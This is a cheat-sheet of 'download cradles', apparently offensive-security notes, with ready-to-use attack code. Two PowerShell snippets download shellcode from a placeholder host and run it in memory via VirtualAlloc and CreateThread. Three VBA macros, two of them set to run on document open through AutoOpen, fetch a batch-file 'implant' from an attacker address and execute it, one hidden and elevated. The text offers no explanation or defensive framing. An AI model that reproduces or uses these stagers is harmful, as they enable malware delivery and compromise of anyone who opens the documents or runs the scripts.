# Download Cradle

## Powershell

```powershell
$Code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$WinAPI = Add-Type -memberDefinition $Code -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $buf = (New-Object Net.WebClient).DownloadData("http://<IP>/shellcode.bin")

$addr = $WinAPI::VirtualAlloc(0, [Math]::Max($buf.Length,0x1000), 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)

$WinAPI::CreateThread(0, 0, $addr, 0, 0, 0)
```


```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $Win32

$shellcode = (New-Object Net.WebClient).DownloadData("http://<IP>/shellcode.bin")
if ($shellcode -eq $null) {
    Exit
}
$size = $shellcode.Length

[IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x1000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
$thandle = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0)
[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

## VBA

```vbscript
Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" _
(ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, _
ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

Sub DownloadFile()
	Call URLDownloadToFileA(0, "http[s]://<IP>", "C:\path\to\file", 0, 0)
End Sub
```


```vbscript
Sub AutoOpen()
    Set WObject = CreateObject("WScript.Shell")

    ' Change these
    FileURL = "http://<Your Public IP>:8080/launcher.bat"
    FileLocation = "C:\Users\Public\Documents\launcher.bat"
    Execute_Command = """C:\Users\Public\Documents\launcher.bat"""

    'Fetch the file

    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")

    objXMLHTTP.Open "GET", FileURL, False objXMLHTTP.send

    If objXMLHTTP.Status = 200 Then
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Open
        objADOStream.Type = 1 'adTypeBinary

    objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.Position = 0 'Set the stream position to the start

    Set objFSO = CreateObject("Scripting.FileSystemObject")
        If objFSO.Fileexists(FileLocation) Then objFSO.DeleteFile FileLocation
    Set objFSO = Nothing

    objADOStream.SaveToFile FileLocation
        objADOStream.Close
        Shell Execute_Command
        Set objADOStream = Nothing

        End If

    Set objXMLHTTP = Nothing
End Sub
```


```vbscript
Sub AutoOpen()
    ' https://docs.microsoft.com/en-us/windows/win32/shell/shell-shellexecute
    ' https://www.automateexcel.com/vba/shell/
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    xHttp.Open "GET", "http[s]://<IP>/payload.bat", False
    xHttp.Send

    with bStrm
        .Type = 1 ' binary
        .Open
        .write xHttp.responseBody
        .savetofile "implant.bat", 2 ' overwrite
    End With

    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "implant.bat", "", "", "runas", 0
End Sub
```